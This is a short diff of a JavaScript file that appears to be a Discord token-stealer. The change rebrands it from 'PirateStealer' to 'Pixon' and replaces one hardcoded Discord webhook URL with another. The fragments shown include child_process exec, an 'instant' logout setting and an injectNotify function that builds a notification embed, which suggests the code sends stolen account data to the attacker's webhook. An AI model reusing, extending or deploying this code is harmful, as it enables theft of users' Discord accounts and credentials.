@@ -6,7 +6,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://discord.com/api/webhooks/902200375396925471/XUaWZjXNTINpjuni0WBEfAmAQBQ-KmvHwJ8wi51f6TX9f-tUNeBPyzoe9h5ltoRkrDCW"
+const webhook = "https://discord.com/api/webhooks/905822523470520390/OmqGHZ4tiPydhnzXupCwPfDwxZ9hM4azkYKcTmLB1IFf8eEKywPILHcbKa7nFS1mzkGb"
 
 const config = {
     "logout": "instant",
@@ -170,10 +170,10 @@ function injectNotify() {
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "Pixon"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "Pixon"
             }
           }
         ]
